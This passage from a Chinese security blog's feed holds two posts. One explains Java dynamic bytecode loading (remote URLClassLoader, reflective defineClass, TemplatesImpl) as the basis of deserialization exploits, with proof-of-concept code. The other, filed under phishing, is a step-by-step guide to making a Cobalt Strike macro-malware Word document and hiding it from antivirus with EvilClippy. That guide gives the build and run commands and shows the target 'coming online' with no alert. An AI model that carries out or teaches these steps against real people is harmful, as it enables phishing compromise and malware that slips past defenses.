class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoadHttpRemote</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>&#123;<br>        <span class="hljs-comment">//注意url结尾需要有斜杠</span><br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://localhost:8080/&quot;</span>)&#125;;<br>        URLClassLoader loader = URLClassLoader.newInstance(urls);<br>        Class c= loader.loadClass(<span class="hljs-string">&quot;hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以编译一个简单的HelloWorld程序，放在 <a href="http://localhost:8000/hello.class">http://localhost:8000/hello.class</a> ：</p><p>​    因此，作为攻击者，只要我们能够控制目标<code>Java ClassLoader</code>的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p><h1 id="3-利用ClassLoader-defineClass直接加载字节码"><a href="#3-利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="3.利用ClassLoader#defineClass直接加载字节码"></a>3.利用ClassLoader#defineClass直接加载字节码</h1><p>​    其实java不管是加载远程的class文件，还是本地的class或者jar文件，都是要经历下面三个方法调用的：</p><p>（p神的图）</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/2.png"></p><p>其中：<br>    1.loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass。<br>    2.findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass。<br>    3.defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类。</p><p>由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineClassTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//利用反射来调用。</span><br>        Class clas = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        Method defineclass = clas.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>        defineclass.setAccessible(<span class="hljs-keyword">true</span>);<br>        String base64_code = <span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA\n&quot;</span> +<br>            <span class="hljs-string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs\n&quot;</span> +<br>            <span class="hljs-string">&quot;bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh\n&quot;</span> +<br>            <span class="hljs-string">&quot;L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry\n&quot;</span> +<br>            <span class="hljs-string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n\n&quot;</span> +<br>            <span class="hljs-string">&quot;OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA\n&quot;</span> +<br>            <span class="hljs-string">&quot;AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>;<br>        BASE64Decoder base64Decoder = <span class="hljs-keyword">new</span> BASE64Decoder();<br>        <span class="hljs-keyword">byte</span>[] code = base64Decoder.decodeBuffer(base64_code);<br>        Class Hello = (Class)defineclass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        Hello.newInstance();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​    这里需要注意的是，<code>ClassLoader#defineClass</code>返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/3.png"></p><p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p><h1 id="4-利用TemplatesImpl加载字节码"><a href="#4-利用TemplatesImpl加载字节码" class="headerlink" title="4.利用TemplatesImpl加载字节码"></a>4.利用TemplatesImpl加载字节码</h1><p>在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影。因此也是我们学习的目标。虽然大部分上层开发者不会直接使用到<code>defineClass</code>方法，同时<code>java.lang.ClassLoader</code>的<code>defineClass</code>方法作用域是不开放的（<code>protected</code>），但是Java底层还是有一些类用到了它，就是 <code>TemplatesImpl </code>。不然也没有学习他的必要了。</p><p>这个<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类里面定义了一个内部类：<code>TransletClassLoader</code></p><p>可以看到这个类是继承<code>ClassLoader</code>的，同时它也重写了<code>defineClass</code>方法，并且没有显式地定义方法的作用域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的<code>defineClass</code>由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/4.png"></p><p>下面是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中关于<code>TransletClassLoader#defineClass()</code>的调用栈。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;<br>TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>追到最前面两个方法 <code>TemplatesImpl#getOutputProperties() </code>、<code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用。我们尝试用<code>newTransformer()</code> 构造一个简单的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-keyword">byte</span>[] code =<br>            <span class="hljs-keyword">new</span> BASE64Decoder().decodeBuffer(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA&quot;</span>+<br>                <span class="hljs-string">&quot;CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP&quot;</span>+<br>                <span class="hljs-string">&quot;TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0&quot;</span>+<br>                <span class="hljs-string">&quot;aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm&quot;</span>+<br>                <span class="hljs-string">&quot;KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y&quot;</span>+<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw&quot;</span>+<br>                <span class="hljs-string">&quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp&quot;</span>+<br>                <span class="hljs-string">&quot;bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb&quot;</span>+<br>                <span class="hljs-string">&quot;DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB&quot;</span>+<br>                <span class="hljs-string">&quot;AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj&quot;</span>+<br>                <span class="hljs-string">&quot;dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z&quot;</span>+<br>                <span class="hljs-string">&quot;bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;</span>+<br>                <span class="hljs-string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;</span>+<br>                <span class="hljs-string">&quot;OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA&quot;</span>+<br>                <span class="hljs-string">&quot;AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA&quot;</span>+<br>                <span class="hljs-string">&quot;AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA&quot;</span>+<br>                <span class="hljs-string">&quot;DwABABAAAAACABE=&quot;</span>);<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/5.png"></p><p>​    这里我设置了三个属性：<code> _bytecodes</code>、<code> _name</code>和<code>_tfactory</code>。<code> _bytecodes</code> 是由字节码组成的数组；<code> _name</code> 可以是任意字符串，只要不为null即可；<code>_tfactory </code>需要是一个 <code>TransformerFactoryImpl </code>对象，因为<code>TemplatesImpl#defineTransletClasses() </code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。至于为何要设置这些属性，具体的分析可以看这篇文章：</p><p>大木头师傅的文章<a href="http://wjlshare.com/archives/1509">Java反序列化-CommonsCollections2分析</a></p><p>​    另外，值得注意的是，<code>TemplatesImpl</code>中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateImplTarget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> TransletException </span>&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="hljs-function"><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplateImplTarget</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/6.png"></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p><a href="http://wjlshare.com/archives/1509#0x03_TemplatesImpl">http://wjlshare.com/archives/1509#0x03_TemplatesImpl</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    本篇文章依旧是参照代码审计的知识星球里的《JAVA安全漫谈系列》的文章。&lt;/p&gt;
&lt;h1 id=&quot;1-什么是Java的字节码&quot;&gt;&lt;a href=&quot;#1-什么是Java的字节码&quot; class=&quot;headerlink&quot; title=&quot;1.什么是Java的字节码&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Office宏病毒文件制作以及简单免杀</title>
    <link href="https://reader-l.github.io/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/"/>
    <id>https://reader-l.github.io/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/</id>
    <published>2021-03-28T10:07:21.000Z</published>
    <updated>2021-03-28T10:42:32.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-获取恶意VBA代码"><a href="#1-获取恶意VBA代码" class="headerlink" title="1.获取恶意VBA代码"></a>1.获取恶意VBA代码</h1><p>​    在这里用CS来进行演示：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1.png"></p><p>选取设置你的监听器：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/2.png"></p><p>复制CS生成的宏病毒VBA代码：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/3.png"></p><h1 id="2-将打开Office对宏的支持"><a href="#2-将打开Office对宏的支持" class="headerlink" title="2.将打开Office对宏的支持"></a>2.将打开Office对宏的支持</h1><p>打开word文档，点击选项功能。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/4.png"></p><p>在word选项中的<code>自定义功能区</code>中点击对<code>开发工具</code>的支持</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/5.png"></p><h1 id="3-创建宏病毒文件"><a href="#3-创建宏病毒文件" class="headerlink" title="3.创建宏病毒文件"></a>3.创建宏病毒文件</h1><p>创建文档并创建宏</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/6.png"></p><p>而后将CS生成的VBA代码复制进去，保存后即可创建完成。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/7.png"></p><p>当目标点击<code>启用宏</code>的选项之后就会上线：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/9.png"></p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/10.png"></p><p>当然，基础的office宏病毒文件是无法逃过杀软的查杀的，需要进行一定的免杀处理。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/8.png"></p><h1 id="4-利用工具免杀躲过杀软"><a href="#4-利用工具免杀躲过杀软" class="headerlink" title="4.利用工具免杀躲过杀软"></a>4.利用工具免杀躲过杀软</h1><p><strong>EvilClippy是一款专用于创建恶意MS Office测试文档的跨平台安全工具，它可以隐藏VBA宏和VBA代码，并且可以对宏代码进行混淆处理以增加宏分析工具的分析难度。当前版本的EvilClippy支持在Linux、macOS和Windows平台上运行，实现了跨平台特性。</strong></p><p>下载链接：<a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p><p>根据该工具的介绍：</p><h2 id="工具的安装："><a href="#工具的安装：" class="headerlink" title="工具的安装："></a>工具的安装：</h2><p>在Linux下使用该工具需要先安装：<code>Mono</code></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo apt-<span class="hljs-built_in">get</span>  install  <span class="hljs-built_in">mono</span>-complete<br></code></pre></td></tr></table></figure><p>然后用如下命令即可编译成功：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mono-csc /reference:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">OpenMcdf</span>.</span></span>dll,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span><span class="hljs-module"><span class="hljs-identifier">IO</span>.</span><span class="hljs-module"><span class="hljs-identifier">Compression</span>.</span><span class="hljs-module"><span class="hljs-identifier">FileSystem</span>.</span></span>dll /out:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClippy</span>.</span></span>exe *.cs<br></code></pre></td></tr></table></figure><h2 id="工具的使用（免杀）："><a href="#工具的使用（免杀）：" class="headerlink" title="工具的使用（免杀）："></a>工具的使用（免杀）：</h2><p>首先创建一个正常的vba代码文件，因为该工具的原理就是利用正常的vba代码和带有宏病毒vba代码的文件进行混淆来绕过杀软的查杀。</p><p>test.vba</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">Sub</span> <span class="hljs-function"><span class="hljs-title">test</span>()</span><br><br><span class="hljs-variable">Dim</span> <span class="hljs-variable">X</span><br><br><span class="hljs-variable">X</span> = <span class="hljs-function"><span class="hljs-title">MsgBox</span>(<span class="hljs-string">&quot;test&quot;</span>)</span><br></code></pre></td></tr></table></figure><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/11.png"></p><p>然后执行如下命令</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClippy</span>.</span></span>exe -s test.vba <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Doc1</span>.</span></span>doc<br></code></pre></td></tr></table></figure><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/12.png"></p><h1 id="5-效果"><a href="#5-效果" class="headerlink" title="5.效果"></a>5.效果</h1><p>成功上线</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/13.png"></p><p>同时用杀软进行查杀没有任何警报：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/14.png"></p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://www.freebuf.com/articles/terminal/202408.html">https://www.freebuf.com/articles/terminal/202408.html</a></p><p><a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-获取恶意VBA代码&quot;&gt;&lt;a href=&quot;#1-获取恶意VBA代码&quot; class=&quot;headerlink&quot; title=&quot;1.获取恶意VBA代码&quot;&gt;&lt;/a&gt;1.获取恶意VBA代码&lt;/h1&gt;&lt;p&gt;​    在这里用CS来进行演示：&lt;/p&gt;
&lt;p&gt;&lt;img src=</summary>
      
    
    
    
    <category term="钓鱼" scheme="https://reader-l.github.io/categories/%E9%92%93%E9%B1%BC/"/>
    
    
  </entry>
  
</feed>
